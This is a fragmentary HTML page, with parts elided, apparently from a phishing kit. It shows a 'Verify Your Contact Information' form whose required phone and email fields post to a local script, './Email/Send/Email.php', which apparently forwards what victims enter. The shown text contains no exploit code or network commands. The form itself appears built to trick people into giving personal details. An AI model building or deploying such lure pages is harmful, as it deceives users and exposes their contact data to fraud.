...
<form action="./Email/Send/Email.php" autocomplete="off" method="post" novalidate="novalidate">
...
<p data-v-02a6d155="" data-v-6745c8f2="" class="q-ma-none text-body1">Verify Your Contact Information.
</p>
</div>
</div>
</div>
...
<input   name="Phone" id="Phone"  type="text"  maxlength="19" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">
...
<div tabindex="-1" class="q-field__control relative-position row no-wrap">
<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
<input   name="email" id="email"  type="email"  maxlength="49" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">
